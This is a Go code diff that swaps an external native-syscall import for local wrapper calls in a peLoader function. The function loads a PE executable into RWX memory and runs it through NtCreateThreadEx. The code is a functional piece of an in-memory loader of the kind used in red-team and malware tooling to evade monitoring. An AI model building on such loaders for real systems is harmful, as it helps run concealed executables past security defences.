@@ -8,8 +8,8 @@ import (
 	"io/ioutil"
 	"syscall"
 	"unsafe"
-	"github.com/carved4/go-native-syscall"
 	"loader/pkg/types"
+	"loader/pkg/wrappers"
 	"strings"
 	"strconv"
 	"runtime"
@@ -389,7 +389,7 @@ func peLoader(bytes0 *[]byte) error {
 	relocTable := types.GetRelocTable(tgtFile)
 	preferableAddress := tgtFile.OptionalHeader.ImageBase
 
-	status, err := winapi.NtUnmapViewOfSection(0xffffffffffffffff, uintptr(tgtFile.OptionalHeader.ImageBase))
+	status, err := wrappers.NtUnmapViewOfSection(0xffffffffffffffff, uintptr(tgtFile.OptionalHeader.ImageBase))
 	if err != nil {
 		// continue anyway, lazy but it could be expected
 	}
@@ -398,7 +398,7 @@ func peLoader(bytes0 *[]byte) error {
 	regionSize := uintptr(tgtFile.OptionalHeader.SizeOfImage)
 	
 	imageBaseForPE = uintptr(preferableAddress)
-	status, err = winapi.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)
+	status, err = wrappers.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)
 
 	if status != 0 && relocTable == nil {
 		return fmt.Errorf("[ERROR] no relocation table and cannot load to preferred address (status: 0x%x)", status)
@@ -407,7 +407,7 @@ func peLoader(bytes0 *[]byte) error {
 	if status != 0 && relocTable != nil {
 		imageBaseForPE = 0
 		regionSize = uintptr(tgtFile.OptionalHeader.SizeOfImage)
-		status, err = winapi.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)
+		status, err = wrappers.NtAllocateVirtualMemory(0xffffffffffffffff, &imageBaseForPE, 0, &regionSize, 0x00001000|0x00002000, 0x40)
 
 		if status != 0 {
 			return fmt.Errorf("[ERROR] cannot allocate memory for PE (status: 0x%x, err: %v)", status, err)
@@ -454,7 +454,7 @@ func peLoader(bytes0 *[]byte) error {
 	runtime.KeepAlive(&pinnedBytes[0])
 	
 	var threadHandle uintptr
-	status, err = winapi.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
+	status, err = wrappers.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
 	if status != 0 {
 		return fmt.Errorf("[ERROR] failed to create thread (status: 0x%x, err: %v)", status, err)
 	}
@@ -463,7 +463,7 @@ func peLoader(bytes0 *[]byte) error {
 	runtime.KeepAlive(bytes0)
 	runtime.KeepAlive(&pinnedBytes[0])
 
-	status, err = winapi.NtWaitForSingleObject(threadHandle, false, nil)
+	status, err = wrappers.NtWaitForSingleObject(threadHandle, false, nil)
 	if status == 0 {
 	} else if status == 0x80000004 {
 		status = 0
@@ -477,7 +477,7 @@ func peLoader(bytes0 *[]byte) error {
 	runtime.KeepAlive(bytes0)
 	runtime.KeepAlive(&pinnedBytes[0])
 	
-	winapi.NtClose(threadHandle)
+	wrappers.NtClose(threadHandle)
 	
 	return nil	
 }
